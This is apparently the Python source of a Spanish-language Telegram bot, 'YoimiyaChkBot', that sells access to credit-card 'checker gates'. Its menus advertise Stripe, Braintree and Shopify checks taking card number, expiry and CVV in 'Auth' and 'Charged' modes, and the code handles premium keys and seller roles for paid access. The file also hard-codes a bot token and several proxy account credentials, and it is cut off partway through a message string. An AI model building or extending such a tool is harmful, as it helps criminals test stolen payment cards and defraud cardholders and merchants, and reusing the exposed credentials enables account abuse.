import logging
from logging import Handler, handlers
from multiprocessing import context
import os
import json
from time import strftime
from time import gmtime, strftime
from signal import Handlers
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import random
import logging
import os
import requests
import time
import string
import random
import asyncio
import re
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint
import random
import logging
import os
import requests
import time
import string
import random
import asyncio
import re
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint
import random
from aiogram import Dispatcher, types
from aiogram.dispatcher.filters import Text
from aiogram.types import Message


from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import ParseMode

from aiogram.types import Message


from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup



##
uniproxy = requests.session()
uniproxy.proxies = uniproxy 
##

proxys = {
    'http':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https': 'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}


comand = "?/.,+*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)
owner = [5019536742]
import logging
import asyncio
from aiogram import Dispatcher, types
from aiogram.dispatcher.filters import Text


from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ParseMode

bot = Bot(token="6188249734:AAH0h51am6PcCseOo1OgfFvpo0BKj8LTJks", parse_mode=types.ParseMode.HTML)
storage = MemoryStorage()
iniciar = Dispatcher(bot, storage=storage)

from aiogram import Dispatcher, types
from aiogram.dispatcher.filters import Text


from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import CallbackQuery, Message
from aiogram.utils.exceptions import MessageNotModified
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import CallbackQuery, Message
from aiogram.utils.exceptions import MessageNotModified

# Función para crear el botón "gates"
# Función para crear el botón "gates"
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import CallbackQuery, Message
from aiogram.utils.exceptions import MessageNotModified

# Función para crear el botón "gates"
def create_gates_button():
    gates_button = InlineKeyboardButton("Gates", callback_data="gates")
    return gates_button

# Función para crear el menú desplegable de "auth"
def create_auth_menu():
    auth_menu = InlineKeyboardMarkup(row_width=1)
    auth_button = InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk | 𝗖𝗮𝗻𝗮𝗹 𝗱𝗲 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮𝘀: @yoimiyarefes", callback_data="auth")
    return_button = InlineKeyboardButton("Return", callback_data="return")
    auth_menu.add(auth_button, return_button)
    return auth_menu

# Función para crear el menú desplegable de "charged"
def create_charged_menu():
    charged_menu = InlineKeyboardMarkup(row_width=1)
    charged_button = InlineKeyboardButton("𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁: @DiegoAkk | 𝗖𝗮𝗻𝗮𝗹 𝗱𝗲 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗶𝗮𝘀: @yoimiyarefes", callback_data="charged")
    return_button = InlineKeyboardButton("Return", callback_data="return")
    charged_menu.add(charged_button, return_button)
    return charged_menu

# Función para manejar el callback del botón "gates"
async def gates_callback_handler(callback_query: CallbackQuery, state: FSMContext):
    gates_menu = InlineKeyboardMarkup(row_width=1)
    auth_button = InlineKeyboardButton("Auth", callback_data="auth")
    charged_button = InlineKeyboardButton("Charged", callback_data="charged")
    gates_menu.add(auth_button, charged_button)
    await callback_query.message.edit_reply_markup(reply_markup=gates_menu)



# Función para manejar los callbacks de los menús desplegables de "auth" y "charged"
async def sub_menu_callback_handler(callback_query: CallbackQuery, state: FSMContext):
    if callback_query.data == "return":
        # Si se selecciona "Return", se vuelve al menú anterior
        cmd_menu = InlineKeyboardMarkup(row_width=1)
        gates_button = create_gates_button()
        cmd_menu.add(gates_button)
        await callback_query.message.edit_text(text="𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 @YoimiyaChkBot | 𝗙𝗿𝗲𝗲 [𝟯] | 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 [𝟯]", reply_markup=cmd_menu)
    
    elif callback_query.data == "auth":
        # Si se selecciona "Charged", se muestra el texto del menú desplegable de "charged"
        auth_text = """[ϟ] 𝐆̲𝐚̲𝐭̲𝐞̲𝐬̲ ̲𝐀̲𝐮̲𝐭̲𝐡̲:

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐚𝐮𝐭𝐡: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 𝟏 [𝐅𝐑𝐄𝐄]
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐭𝐫𝐢𝐩𝐞

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐬𝐭𝐩: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐟𝐟 ❌
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 𝟐 [𝐏𝐑𝐄𝐌𝐈𝐔𝐌]
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐭𝐫𝐢𝐩𝐞

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐲𝐦: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 𝟑 [𝐏𝐑𝐄𝐌𝐈𝐔𝐌]
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐭𝐫𝐢𝐩𝐞

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐜𝐡𝐤: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐀𝐮𝐭𝐡 [𝐏𝐑𝐄𝐌𝐈𝐔𝐌]
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐀𝐮𝐭𝐡

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐞𝐫𝐥𝐲: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐒𝐭𝐫𝐢𝐩𝐞 𝐀𝐮𝐭𝐡 𝟒 [𝐏𝐑𝐄𝐌𝐈𝐔𝐌]
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐭𝐫𝐢𝐩𝐞
"""
        try:
            await callback_query.message.edit_text(text=auth_text, reply_markup=create_auth_menu())
        except MessageNotModified:
            pass
    elif callback_query.data == "charged":
        # Si se selecciona "Charged", se muestra el texto del menú desplegable de "charged"
        charged_text = """[ϟ] 𝘎𝘢𝘵𝘦𝘴 𝘊𝘩𝘢𝘳𝘨𝘦𝘥:

[🝂] 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐩𝐞𝐧𝐞: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
[🝂] 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
[🝂] 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐒𝐭𝐫𝐢𝐩𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟏$ [𝐏𝐑𝐄𝐌𝐈𝐔𝐌]
[🝂] 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐭𝐫𝐢𝐩𝐞

[🝂] 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐜𝐡: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
[🝂] 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
[🝂] 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐂𝐡𝐨𝐢𝐜𝐞 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝟓$ [𝐅𝐑𝐄𝐄]
[🝂] 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐭𝐫𝐢𝐩𝐞

- ↯ 𝘐𝘯𝘱𝘶𝘵: [🝂] /𝐬𝐭𝐫: 𝐜𝐜|𝐦𝐞𝐬|𝐚𝐧𝐨|𝐜𝐯𝐯
- ↯ 𝘎𝘢𝘵𝘦 𝘚𝘵𝘢𝘵𝘶𝘴: 𝐎𝐧 ✅
- ↯ 𝘕𝘢𝘮𝘦 𝘎𝘢𝘵𝘦: 𝐒𝐭𝐫𝐚𝐢𝐤𝐞𝐫 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 [𝐅𝐑𝐄𝐄]
- ↯ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: 𝐒𝐡𝐨𝐩𝐢𝐟𝐲+𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞

"""
        await callback_query.message.edit_text(text=charged_text, reply_markup=create_auth_menu())
       
        try:
            await callback_query.message.edit_text(text=charged_text, reply_markup=create_charged_menu())
        except MessageNotModified:
            pass

@iniciar.message_handler(commands=["gates"], commands_prefix=comand)
async def cmd_handler(message: Message):
    cmd_menu = InlineKeyboardMarkup(row_width=1)
    gates_button = create_gates_button()
    cmd_menu.add(gates_button)
    await message.answer('𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 @YoimiyaChkBot | 𝗙𝗿𝗲𝗲 [𝟯] | 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 [𝟯]', reply_markup=cmd_menu)

# Registro de los handlers
# Registro de los handlers
iniciar.register_message_handler(cmd_handler, commands=["gates", ".", "*", "/gates", ".gates"])
iniciar.register_callback_query_handler(gates_callback_handler, text="gates")
iniciar.register_callback_query_handler(sub_menu_callback_handler, text="auth", state="*")
iniciar.register_callback_query_handler(sub_menu_callback_handler, text="charged", state="*")
iniciar.register_callback_query_handler(sub_menu_callback_handler, text="return", state="*")

button1 = InlineKeyboardButton(text="𝗢𝘄𝗻𝗲𝗿", callback_data="creador")
button2 = InlineKeyboardButton(text="𝗚𝗮𝘁𝗲𝘀", callback_data="gate")
button3 = InlineKeyboardButton(text="𝐌𝐢 𝐂𝐚𝐧𝐚𝐥", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)


with open('admins.txt', 'r') as file:
    admins = [int(line.strip()) for line in file]

with open('admins1.txt', 'r') as file:
    admins1 = [int(line.strip()) for line in file]

with open('valid_keys.txt', 'r') as file:
    valid_keys = [line.strip() for line in file]

with open('claimed_keys.txt', 'r') as file:
    claimed_keys = [line.strip() for line in file]

with open('claimed_users.txt', 'r') as file:
    claimed_users = [int(line.strip()) for line in file if line.strip()]

import random

from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import ParseMode

@iniciar.message_handler(commands=["premium"], commands_prefix=comand)
async def cmds(message: types.Message):
    # Obtener la key a reclamar por medio de la variable
    contra = await message.reply('<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>')
    time.sleep(1)
    user = message.from_user.id
    with open('admins1.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes acceso al comando✅</b>')
        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    key = message.text[len('/premium '):]
    m1 = await contra.edit_text(f"<b>Añadiendo Usuario A La Lista De Premium [🔴]</b>")
    m2 = await m1.edit_text(f"<b>Añadiendo Usuario A La Lista De Premium [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>Añadiendo Usuario A La Lista De Premium [🔴][🟡][🟢]</b>")

    with open('admins.txt', 'a') as file:
        file.write(f"{key}\n")
        admins.append(f"{key}\n")


    await m3.edit_text(f"<b>El usuario con el id de {key} ha sido promovido al nuevo rango [Premium]</b>")
    if not key:
        await m3.edit_text(f"<b>El id que ingreso no es un usuario valido.</b>")


@iniciar.message_handler(commands=["admin"], commands_prefix=comand)
async def cmds(message: types.Message):
    # Obtener la key a reclamar por medio de la variable
    contra = await message.reply('<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>')
    time.sleep(1)
    user = message.from_user.id
    with open('Owner.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes acceso al comando✅</b>')
        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    key = message.text[len('/admin '):]
    m1 = await contra.edit_text(f"<b>Añadiendo Usuario A La Lista De Sellers [🔴]</b>")
    m2 = await m1.edit_text(f"<b>Añadiendo Usuario A La Lista De Sellers [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>Añadiendo Usuario A La Lista De Sellers [🔴][🟡][🟢]</b>")
    with open('admins1.txt', 'a') as file:
        file.write(f"{key}\n")
        admins1.append(f"{key}\n")

    with open('admins.txt', 'a') as file:
        file.write(f"{key}\n")
        admins.append(f"{key}\n")


    await m3.edit_text(f"<b>El usuario con el id de {key} ha sido promovido al nuevo rango [Seller]</b>")
    if not key:
        await m3.edit_text(f"<b>El id que ingreso no es un usuario valido.</b>")


@iniciar.message_handler(commands=["genkey"], commands_prefix=comand)
async def generate_key_handler(message: types.Message, state: FSMContext):
    contra = await message.reply('<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>')
    time.sleep(1)
    user = message.from_user.id
    with open('admins1.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')
        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
        # El ID del usuario no está en el archivo
        # Hacer algo aquí si no se cumple la condición
            


    # Obtener el número de días para la duración de la key uwu
    params = message.text.split(' ')[1]
    if len(params) == 0 or params != 'test' and not params.isdigit():
        await message.reply("Wrong Input Check Example: /gkey days[int] | test")
        return
    data = int(params) if params.isdigit() else 1

    # Generar una key aleatoria :3
    rand_digit = random.randint(1, 1000)
    rand_string = ''.join(random.choices('ABCDEFGHIJKLMNÑOPQRSTUVWXYZ', k=5))
    key = f"YOIMIYA-{rand_digit}-{rand_string}-PREMIUM" #cambiar yoimiya por el de kurama mano

    # Agregar la key a la lista de keys válidas pa x
    with open('valid_keys.txt', 'a') as file:
        file.write(f"{key}\n")

    valid_keys.append(key)


    FIRST = message.from_user.first_name
    m1 = await contra.edit_text(f"<b>💳gєηєяαη∂σ кєу: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>gєηєяαη∂σ кєу: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>gєηєяαη∂σ кєу: [🔴][🟡][🟢]</b>")

    caption=f"""
╔═══════════════════════╗
╟ ● 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝗱𝗮 𝗰𝗼𝗻 𝗲𝘅𝗶𝘁𝗼 ✅
╟═══════════════════════╝
╟ [🝂] 𝗞𝗲𝘆:
╟ <code>{key}</code>
╟ [🝂] 𝗗𝘂𝗿𝗮𝗰𝗶𝗼𝗻:
╟ {data} dias/dia
╟ [🝂] 𝗚𝗲𝗻𝗲𝗿𝗮𝗱𝗮 𝗽𝗼𝗿:
╟ {FIRST} <b>[Seller]</b>
╟ [🝂] 𝗨𝘀𝗲:
╟ <code>/claim {key}</code> <b> para canjear la key!</b>"""
    
    
    photo_url = "https://i.pinimg.com/736x/f8/6b/27/f86b270ca31f0fadccc020c89e2d6122.jpg"
    

    await m3.reply_photo(photo=photo_url, caption=caption)
    # Enviar la key al usuario que la solicitó con el texto q kieras
    #imagen = types.InputMediaPhoto('https://i.pinimg.com/736x/f8/6b/27/f86b270ca31f0fadccc020c89e2d6122.jpg',
     #                              caption=f"""
#╔═══════════════════════╗
#╟ ● **Key Generada Con Éxito** ✅
#╟═══════════════════════╝
#╟ [🝂] 𝗞𝗲𝘆:
#╟ <code>{key}</code>
#╟ [🝂] 𝗗𝘂𝗿𝗮𝗰𝗶𝗼𝗻:
#╟ {data} dias/dia
#╟ [🝂] 𝗚𝗲𝗻𝗲𝗿𝗮𝗱𝗮 𝗽𝗼𝗿:
#╟ {FIRST} <b>[Seller]</b>
#╟ [🝂] 𝗨𝘀𝗲:
#╟ <code>/claim {key}</code> <b> para canjear la key!</b>
#""")
    
    # Enviar el mensaje con la imagen y el texto juntos
  #  await m3.edit_media(media=imagen)
   


@iniciar.message_handler(commands=["claim"], commands_prefix=comand)
async def cmds(message: types.Message):
    # Obtener la key a reclamar por medio de la variable
    key = message.text[len('/claim '):]  
    idss = message.from_user.id
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Reclamando Key 🔴</b>")
    m1 = await contra.edit_text(f"<b>💳Reclamando Key: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>Reclamando Key: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>Reclamando Key: [🔴][🟡][🟢]</b>")
    if not key:
        await contra.edit_text("<b>Canjeador de keys, ejemplo: /claim [key]</b>")

    # Verificar si la key es válida y no ha sido reclamada antes
    if key in valid_keys and key not in claimed_keys:
        user = message.from_user.id
        ID = message.from_user.id
        FIRST = message.from_user.first_name
        photo_url = "https://i.pinimg.com/736x/f8/6b/27/f86b270ca31f0fadccc020c89e2d6122.jpg"
    

        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                photo = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5b7f881-eac5-4400-8f41-97a2b6d3f000/dfapmfm-d7447dc8-ffc0-49ea-96c0-6a099738ecb2.png/v1/fill/w_1280,h_1280,q_80,strp/yoimiya___genshin_impact_by_logical2k_dfapmfm-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTI4MCIsInBhdGgiOiJcL2ZcL2M1YjdmODgxLWVhYzUtNDQwMC04ZjQxLTk3YTJiNmQzZjAwMFwvZGZhcG1mbS1kNzQ0N2RjOC1mZmMwLTQ5ZWEtOTZjMC02YTA5OTczOGVjYjIucG5nIiwid2lkdGgiOiI8PTEyODAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.yby085tZtutQdtaBhuB_i_Vo0btEEotbvAIuTQCUSXw'
                caption2=f"""
╔═══════════════════════╗
╟ ● 𝙍𝙚𝙚𝙙𝙚𝙢 𝙁𝙖𝙞𝙡𝙚𝙙 ❌
╟═══════════════════════╝
╟ [🝂] 𝙍𝙚𝙖𝙨𝙤𝙣: 
╟ 𝙔𝙖 𝙩𝙞𝙚𝙣𝙚𝙨 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙢𝙖𝙣𝙤, 𝙙𝙚𝙟𝙖 𝙦𝙪𝙚 𝙤𝙩𝙧𝙤 𝙡𝙖 𝙘𝙖𝙣𝙟𝙚𝙚
╟ [🝂] 𝘾𝙝𝙠 𝘽𝙮:
╟ {FIRST} <b>[Premium]</b>
╟ [🝂] 𝙊𝙬𝙣𝙚𝙧 𝘽𝙤𝙩:
╟ @DiegoAkk
╚═══════════════════════╝"""
                await m3.reply_photo(photo=photo, caption=caption2)

            else:
                
                with open('claimed_keys.txt', 'a') as file:
                    file.write(f"{key}\n")
                    claimed_keys.append(key)
                
            

                with open('admins.txt', 'a') as file:
                    file.write(f"{message.from_user.id}\n")
                    admins.append(message.from_user.id)

                with open('claimed_users.txt', 'a') as file:
                    file.write(f"{message.from_user.id}\n")
                    claimed_users.append(message.from_user.id)
                
                photo1 = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5b7f881-eac5-4400-8f41-97a2b6d3f000/dfapmfm-d7447dc8-ffc0-49ea-96c0-6a099738ecb2.png/v1/fill/w_1280,h_1280,q_80,strp/yoimiya___genshin_impact_by_logical2k_dfapmfm-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTI4MCIsInBhdGgiOiJcL2ZcL2M1YjdmODgxLWVhYzUtNDQwMC04ZjQxLTk3YTJiNmQzZjAwMFwvZGZhcG1mbS1kNzQ0N2RjOC1mZmMwLTQ5ZWEtOTZjMC02YTA5OTczOGVjYjIucG5nIiwid2lkdGgiOiI8PTEyODAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.yby085tZtutQdtaBhuB_i_Vo0btEEotbvAIuTQCUSXw'
                caption3=f"""
╔═══════════════════════╗
╟ ● 𝗥𝗲𝗲𝗱𝗲𝗺 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹 ✅
╟═══════════════════════╝
╟ [🝂] 𝗥𝗲𝗮𝘀𝗼𝗻: 
╟ 𝗞𝗲𝘆 𝗿𝗲𝗰𝗹𝗮𝗺𝗮𝗱𝗮 𝗲𝘅𝗶𝘁𝗼𝘀𝗮𝗺𝗲𝗻𝘁𝗲, 𝗯𝗶𝗲𝗻𝘃𝗲𝗻𝗶𝗱𝗼.
╟ [🝂] 𝗡𝗲𝘄 𝗦𝘁𝗮𝘁𝘂𝘀:
╟ {FIRST} <b>[Premium]</b>
╟ [🝂] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁:
╟ @DiegoAkk
╚═══════════════════════╝"""
                await m3.reply_photo(photo=photo1, caption=caption3)
    else:
        photoz = 'https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5b7f881-eac5-4400-8f41-97a2b6d3f000/dfapmfm-d7447dc8-ffc0-49ea-96c0-6a099738ecb2.png/v1/fill/w_1280,h_1280,q_80,strp/yoimiya___genshin_impact_by_logical2k_dfapmfm-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTI4MCIsInBhdGgiOiJcL2ZcL2M1YjdmODgxLWVhYzUtNDQwMC04ZjQxLTk3YTJiNmQzZjAwMFwvZGZhcG1mbS1kNzQ0N2RjOC1mZmMwLTQ5ZWEtOTZjMC02YTA5OTczOGVjYjIucG5nIiwid2lkdGgiOiI8PTEyODAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.yby085tZtutQdtaBhuB_i_Vo0btEEotbvAIuTQCUSXw'
        FIRST = message.from_user.first_name
        caption2=f"""
╔═══════════════════════╗
╟ ● 𝙍𝙚𝙚𝙙𝙚𝙢 𝙁𝙖𝙞𝙡𝙚𝙙 ❌
╟═══════════════════════╝
╟ [🝂] 𝙍𝙚𝙖𝙨𝙤𝙣: 
╟ 𝙆𝙚𝙮 𝙮𝙖 𝙘𝙖𝙣𝙟𝙚𝙖𝙙𝙖 𝙤 𝙞𝙣𝙫𝙖𝙡𝙞𝙙𝙖.
╟ [🝂] 𝗖𝗵𝗸 𝗕𝘆:
╟ {FIRST}
╟ [🝂] 𝙊𝙬𝙣𝙚𝙧 𝘽𝙤𝙩:
╟ @DiegoAkk
╚═══════════════════════╝"""
        await m3.reply_photo(photo=photoz, caption=caption2)
        # Si la key no es válida o ya fue reclamada, avisar al usuario xd
        
@iniciar.message_handler(commands=["deletekey"], commands_prefix=comand)
async def cmds(message: types.Message):
    contra = await message.reply('<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>')
    time.sleep(1)
    user = message.from_user.id
    
    with open('admins1.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')
        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    
    FIRST = message.from_user.first_name
    m1 = await contra.edit_text(f"<b>💳Eliminando Key: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>Eliminando Key: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>Eliminando Key: [🔴][🟡][🟢]</b>")
    params = message.text.split(' ')[1]
    if len(params) == 0:
        await message.reply("Por favor, ingresa una key para eliminar.")
        return
    key_to_delete = params.strip()

    # Leer las llaves válidas del archivo
    with open('valid_keys.txt', 'r') as file:
        valid_keys = [line.strip() for line in file.readlines()]

    # Verificar si la llave a eliminar está en la lista de llaves válidas
    if key_to_delete in valid_keys:
        # Eliminar la llave del archivo
        with open('valid_keys.txt', 'w') as file:
            for key in valid_keys:
                if key != key_to_delete:
                    file.write(f"{key}\n")
        await m3.edit_text(f"""
╔═══════════════════════╗
╟ ● 𝗦𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹 𝗸𝗲𝘆 𝗱𝗲𝗹𝗲𝘁𝗶𝗼𝗻 ✅
╟═══════════════════════╝
╟ [🝂] 𝗔𝗰𝘁𝗶𝗼𝗻: 
╟ 𝗟𝗮 𝗸𝗲𝘆 {key_to_delete} 𝗵𝗮 𝘀𝗶𝗱𝗼 𝗲𝗹𝗶𝗺𝗶𝗻𝗮𝗱𝗮 𝗱𝗲 𝗻𝘂𝗲𝘀𝘁𝗿𝗮 𝗯𝗮𝘀𝗲 𝗱𝗲 𝗱𝗮𝘁𝗼𝘀.
╟ [🝂] 𝗗𝗲𝗹𝗲𝘁𝗲 𝗳𝗼𝗿:
╟ {FIRST} [𝗦𝗲𝗹𝗹𝗲𝗿]
╟ [🝂] 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁:
╟ @DiegoAkk
╚═══════════════════════╝"""
        )
    else:
        await m3.edit_text(f"""
╔═══════════════════════╗
╟ ● 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗸𝗲𝘆 𝗱𝗲𝗹𝗲𝘁𝗶𝗼𝗻 ❌
╟═══════════════════════╝
╟ [🝂] 𝗥𝗲𝗮𝘀𝗼𝗻: 
